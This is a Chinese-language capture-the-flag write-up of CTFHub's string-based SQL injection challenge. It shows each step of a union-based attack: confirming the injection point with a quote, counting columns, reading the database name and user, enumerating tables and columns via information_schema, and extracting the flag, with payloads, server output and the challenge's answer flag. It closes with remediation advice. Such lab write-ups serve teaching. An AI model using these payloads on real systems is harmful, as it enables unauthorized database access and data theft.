CTFHub - Web - SQL注入 - 字符型注入

# CTFHub # Web # SQL注入 # 字符型 # Union注入

一、题目信息

  • 题目名称：字符型注入
  • 题目方向：Web - SQL注入
  • 题目环境：动态分配的 HTTP 服务地址
  • 题目目标：利用字符型 SQL 注入读取数据库中的 flag。

二、判断注入类型

页面提供 id 查询参数。提交 id=1 后，服务端直接回显 SQL 语句和查询结果：

select * from news where id='1'

ID: 1
Data: ctfhub

参数被一对单引号包裹，因此这是字符型注入点。提交单引号触发语法错误：

id=1'
select * from news where id='1''

使用 SQL 注释符闭合原查询，页面恢复正常：

id=1'-- 
select * from news where id='1'-- '

MySQL 注释符 -- 后必须保留一个空格，URL 中可编码为 --%20。

三、确定查询列数

通过 union select 判断原查询的列数。使用两列时，两个回显位置均正常输出：

0' union select 1,2-- 

ID: 1
Data: 2

使用三列时查询失败，说明原查询共有两列。

0' union select 1,2,3--

四、获取数据库信息

将数据库名和当前用户放入两个回显位置：

0' union select database(),user()-- 

ID: sqli
Data: root@localhost

当前数据库为 sqli，Web 应用使用 root 用户连接数据库，权限较高。

五、枚举表和字段

查询当前数据库中的所有表名：

0' union select group_concat(table_name),2
from information_schema.tables
where table_schema=database()--

返回结果：

ID: flag,news
Data: 2

目标表为 flag。继续枚举该表的字段名：

0' union select group_concat(column_name),2
from information_schema.columns
where table_schema=database()
and table_name='flag'--

返回字段：

ID: flag
Data: 2

六、读取 Flag

将 flag 字段放入第一个回显位置：

0' union select flag,2 from flag--

服务端返回：

select * from news where id='0' union select flag,2 from flag-- '
ID: ctfhub{d82640d3e5d76845b292c564}
Data: 2

对应的 URL 编码 payload：

/?id=0%27%20union%20select%20flag%2C2%20from%20flag--%20

七、最终 Flag

ctfhub{d82640d3e5d76845b292c564}

八、修复建议

  • 使用预处理语句和参数绑定，禁止将用户输入直接拼接进 SQL 语句。
  • 对参数执行严格的数据类型校验，例如 id 只接受整数。
  • 数据库账号遵循最小权限原则，Web 应用不应使用 root 账号连接数据库。
  • 关闭生产环境中的 SQL 语句和详细错误回显，避免泄露数据库结构。

九、解题总结

本题的关键是通过单引号报错确认字符型注入点，再利用 union select 判断列数、枚举数据库结构并读取 flag。字符型注入需要先闭合原查询中的单引号，再使用 -- 注释掉后续语句；实际修复时应优先使用参数化查询。
